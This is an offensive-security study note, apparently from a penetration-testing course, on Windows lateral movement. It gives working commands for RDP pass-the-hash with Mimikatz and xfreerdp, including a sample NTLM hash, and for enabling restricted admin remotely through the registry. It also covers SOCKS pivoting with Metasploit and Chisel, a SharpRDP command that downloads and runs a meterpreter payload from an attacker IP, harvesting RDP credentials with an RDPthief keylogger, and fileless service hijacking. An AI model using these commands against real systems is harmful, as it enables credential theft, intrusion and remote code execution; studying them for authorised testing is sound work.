## Windows Lateral Movement
Linking Windows post-exp:
[[Windows Post-exp]]

### RDP Lateral Movement

It start the GUI app - Remote Desktop Connetion:
#lateral-movement 
```cmd
mstsc.exe
```
We can use **/admin** flag to connect as admin (if the user is admin), to not disconnect the currently authenticated user.
Once the **RDP session** is created the **NTLM hashes stays in the lsass.exe** process until proper logout (in case of the server it is never).

One can protect from caching the credentials by setting the **restrictedadmin** by suppling the /restrictedadmin flag to mstsc.exe
#lateral-movement 
```cmd
mstsc.exe /restrictedadmin
```
The **restricted admin** is **disabled by default**, however **when the restrctedadmin is enabled we can do pass the hash**, since the credentials are not being cached. You can check if restrictedadmin is enabled by examine:
#enum #lateral-movement #pass-the-hash
```bat
HKLM:\System\CurrentControlSet\Control\Lsa
# DisableRestrictedAdmin Dword
```

If enabled and you have **NTLM hash**, you can do pass the hash with Mimikatz [[Mimikatz and Rubeus]] or Xfreerdp on Kali:
```cmd
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
```bash
xfreerdp /u:admin /pth:2892D26CDF84D7A70E2EB3B9F05C425E /v:192.168.120.6 /cert-ignore
```

In case you have the ntlm hash, but the restricted admin is disabled, you can enable it by:
1. Starting local Powershell session in the context of the admin user, which is admin on target machine:
#mimikatz #ps1
```cmd
sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```
2. Enter the PSH session on remote computer:
#ps1 #lateral-movement 
```powershell
Enter-PSSession -Computer appsrv01
```
3. Create the DisableRestrictedAdmin registry entry:
#ps1 #lateral-movement 
```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```


### Reverse RDP Proxying with MSF
#lateral-movement  #socks-proxy 
Once the meterpreter is obtained you sent it to the background and do:
```shell
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j
```
Now you have the the socks proxy started on the localhost:1080, so you can use proxychains with that:
``` bash
sudo bash -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf'
proxychains rdesktop IP
```


### Reverse RDP Proxying with Chisel
#lateral-movement #socks-proxy 
Chisel URL https://github.com/jpillora/chisel
To compile:
``` bash
go build
# for Windows
env GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"
```

Now we need to transfer chisel.exe to the victim machine. On Kali we start the chisel server and configure socks5 proxy with ssh.
``` bash
./chisel server -p 8080 --socks5
sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo systemctl start ssh.service
ssh -N -D 0.0.0.0:1080 localhost
```

The on a window victim you run:
``` cmd
chisel.exe client 192.168.49.186:8080 socks
```

Then you could use the **proxychains**.

### RDP as console

mstsc.exe buld upon the mstscax.dll, the library exposes the interface for scripts and compiled code through the COM objects. 
With SharpRDP.exe precompilled, we can do the remote shell without the need of reverse tunnells.
This executes the notepad on the remote system:
#lateral-movement 
```cmd
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
```

You can execute the revese shell easly with powershell, example:
#ps1 #lateral-movement 
``` powershell
sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.186/met64.exe', 'C:\Windows\Tasks\met64.exe'); C:\Windows\Tasks\met64.exe" username=corp1\dave password=lab
```

### Stealing clear text creds from RDP
#creds-leak #keylogger 
We can do API hooking to hook the mstsc.exe process to grab the creds when the user is typing (no need for global keylogger).
Previously we use frida for that, but we can do the same with custom code with WIN32 APIs.

Hooking API with win32APIs was not covered, however we are given with the unmanaged code written compilled RDPthief.dll.
**For keylogger the code refer to the code. It requires precompilled RDPthief.dll**

The results of the RDPthief can be found under the AppData dir:
```cmd
type C:\Users\<username>\AppData\Local\Temp\data.bin
```

### Fileless Lateral Movement

Similar thing that PsExec does, however the PsExec drops the binary for the service to be executed on the disk and then creates new service which is loud. Instead, we would be changing the binary for existing service with the powershell payload (AppLocker might block it, in that case we need certutil or different Applocker bypass [[applocker bypass]]). DCE-RPC to access the Service Control Manager to create new service. 

We can use unmanaged API OpenSCManagerW, the authnetication will be handled by Windows in the context of Access Token of executing thread. We would be using OpenService and ChangeServiceConfigA APIs to open the service and change the service binary. Once that is done we can call StartServiceA. 

#lateral-movement #psexec
**PsLessExec.exe code refer to the code. **

